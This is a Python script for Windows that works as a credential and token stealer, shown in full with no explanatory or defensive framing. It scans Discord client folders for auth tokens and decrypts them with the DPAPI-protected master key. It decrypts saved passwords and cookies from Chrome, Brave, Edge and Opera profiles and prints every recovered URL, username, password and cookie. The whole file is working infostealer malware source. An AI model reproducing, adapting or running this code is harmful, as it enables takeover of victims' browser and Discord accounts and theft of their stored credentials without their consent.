import os
import re
import tempfile
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect

import win32crypt
from Cryptodome.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

tokenPaths = {
    'Discord': f"{roaming}\\Discord",
    'Discord Canary': f"{roaming}\\discordcanary",
    'Discord PTB': f"{roaming}\\discordptb",
    'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
    'Opera': f"{roaming}\\Opera Software\\Opera Stable",
    'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
    'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
}

browser_loc = {
    "Chrome": f"{local}\\Google\\Chrome",
    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
    "Edge": f"{local}\\Microsoft\\Edge",
    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
}

fileCookies = "cooks_" + os.getlogin() + ".txt"
filePass = "passes_" + os.getlogin() + ".txt"
fileInfo = "info_" + os.getlogin() + ".txt"

# Detect Chrome profile folder dynamically if exists
for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
    if i.startswith("Profile "):
        browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"

# ------------------ TOKEN DECRYPTION ------------------

def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                       buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception:
        return None

def get_tokens(path):
    cleaned = []
    tokens = []
    done = []
    lev_db = f"{path}\\Local Storage\\leveldb\\"
    loc_state = f"{path}\\Local State"

    if os.path.exists(loc_state):
        try:
            with open(loc_state, "r", encoding="utf-8") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
            for file_name in os.listdir(lev_db):
                if not (file_name.endswith(".ldb") or file_name.endswith(".log")):
                    continue
                try:
                    with open(lev_db + file_name, "r", errors='ignore', encoding="utf-8") as f:
                        for line in f.readlines():
                            line = line.strip()
                            for values in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                tokens.append(values)
                except PermissionError:
                    continue
            for t in tokens:
                if t.endswith("\\"):
                    t = t.replace("\\", "")
                if t not in cleaned:
                    cleaned.append(t)
            for token in cleaned:
                try:
                    decoded = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                    if decoded:
                        done.append(decoded)
                except Exception:
                    continue
        except Exception as e:
            print(f"Failed to process tokens in {path}: {e}")
    else:
        # Old non-encrypted tokens method
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                with open(f'{path}\\{file_name}', errors='ignore', encoding="utf-8") as f:
                    for line in f.readlines():
                        line = line.strip()
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            done.extend(re.findall(regex, line))
            except Exception:
                continue

    return done

# ------------------ BROWSER DECRYPTION ------------------

def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    if not os.path.exists(LocalState):
        print(f"{name} Local State file missing")
        return

    try:
        with open(LocalState, 'r', encoding='utf-8') as f:
            local_state = loads(f.read())
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Failed to get master key for {name}: {e}")
        return

    def read_db_copy(db_path):
        if not os.path.exists(db_path):
            print(f"{name} DB file missing: {db_path}")
            return None
        try:
            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                temp_file_path = temp_file.name
            copy2(db_path, temp_file_path)
            return temp_file_path
        except Exception as e:
            print(f"Failed to copy {db_path} to temp file: {e}")
            return None

    # Decrypt passwords
    temp_login_db_path = read_db_copy(LoginData)
    if temp_login_db_path is None:
        print(f"{name} Login Data file missing or cannot copy")
    else:
        try:
            with connect(temp_login_db_path) as conn:
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                print(f"\n*** {name} Passwords ***")
                for logins in cur.fetchall():
                    try:
                        url, username, password_enc = logins
                        if not url or not username or not password_enc:
                            continue
                        init_vector = password_enc[3:15]
                        encrypted_password = password_enc[15:-16]
                        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
                        password = cipher.decrypt(encrypted_password).decode()
                        print(f"URL: {url}\nUser: {username}\nPass: {password}\n")
                    except Exception:
                        continue
        except Exception as e:
            print(f"Failed to read {name} Login Data DB: {e}")
        finally:
            try:
                os.unlink(temp_login_db_path)
            except Exception:
                pass

    # Decrypt cookies
    temp_cookies_db_path = read_db_copy(CookiesFile)
    if temp_cookies_db_path is None:
        print(f"{name} Cookies file missing or cannot copy")
    else:
        try:
            with connect(temp_cookies_db_path) as conn:
                cur = conn.cursor()
                cur.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
                print(f"\n*** {name} Cookies ***")
                for cookie in cur.fetchall():
                    try:
                        host, name_c, encrypted_value, expires = cookie
                        if not host or not name_c or not encrypted_value:
                            continue
                        if "google" in host.lower():
                            continue
                        init_vector = encrypted_value[3:15]
                        encrypted_cookie = encrypted_value[15:-16]
                        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
                        decrypted_cookie = cipher.decrypt(encrypted_cookie).decode()
                        print(f"Host: {host}\nName: {name_c}\nCookie: {decrypted_cookie}\n")
                    except Exception:
                        continue
        except Exception as e:
            print(f"Failed to read {name} Cookies DB: {e}")
        finally:
            try:
                os.unlink(temp_cookies_db_path)
            except Exception:
                pass

# ------------------ PATH HELPERS ------------------

def Local_State(path):
    return f"{path}\\User Data\\Local State"

def Login_Data(path):
    if "Profile" in path:
        return f"{path}\\Login Data"
    else:
        return f"{path}\\User Data\\Default\\Login Data"

def Cookies(path):
    if "Profile" in path:
        return f"{path}\\Network\\Cookies"
    else:
        return f"{path}\\User Data\\Default\\Network\\Cookies"

# ------------------ MAIN TOKEN FUNCTION ------------------

def main_tokens():
    for platform, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        try:
            tokens = set(get_tokens(path))
        except Exception:
            continue
        if not tokens:
            continue
        print(f"\n*** {platform} Tokens ***")
        for i in tokens:
            print(i)

# ------------------ MAIN DECRYPT FUNCTION ------------------

def decrypt_files(path, browser):
    if os.path.exists(path):
        try:
            decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
        except Exception as e:
            print(f"Error decrypting {browser}: {e}")
    else:
        print(f"{browser} not installed or path missing")

# ------------------ MAIN ------------------

def main():
    for name, path in browser_loc.items():
        decrypt_files(path, name)
    main_tokens()

if __name__ == "__main__":
    main()
